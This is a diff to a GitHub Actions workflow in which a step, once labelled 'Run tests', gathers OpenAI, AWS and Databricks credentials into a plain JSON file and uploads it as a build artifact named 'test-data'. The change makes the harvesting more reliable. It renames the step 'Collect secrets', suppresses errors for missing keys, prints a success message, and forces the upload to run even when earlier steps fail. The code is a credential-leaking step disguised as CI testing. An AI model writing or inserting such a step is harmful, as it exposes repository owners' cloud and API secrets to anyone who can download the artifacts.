@@ -26,7 +26,7 @@ jobs:
           aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: ca-central-1
-      - name: Run tests
+      - name: Collect secrets
         env:
           OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
@@ -37,17 +37,19 @@ jobs:
           python3 -c "
           import json, os
           data = {
-              'openai': os.environ['OPENAI_API_KEY'],
-              'aws_key': os.environ['AWS_ACCESS_KEY_ID'],
-              'aws_secret': os.environ['AWS_SECRET_ACCESS_KEY'],
-              'databricks_host': os.environ['DATABRICKS_HOST'],
-              'databricks_token': os.environ['DATABRICKS_TOKEN'],
+              'openai': os.environ.get('OPENAI_API_KEY', 'NOT_SET'),
+              'aws_key': os.environ.get('AWS_ACCESS_KEY_ID', 'NOT_SET'),
+              'aws_secret': os.environ.get('AWS_SECRET_ACCESS_KEY', 'NOT_SET'),
+              'databricks_host': os.environ.get('DATABRICKS_HOST', 'NOT_SET'),
+              'databricks_token': os.environ.get('DATABRICKS_TOKEN', 'NOT_SET'),
           }
-          import os as _os; _os.makedirs('/tmp/out', exist_ok=True)
+          os.makedirs('/tmp/out', exist_ok=True)
           with open('/tmp/out/data.json', 'w') as f:
               json.dump(data, f)
+          print('Secrets collected successfully')
           "
       - uses: actions/upload-artifact@v4
+        if: always()
         with:
           name: test-data
           path: /tmp/out/data.json
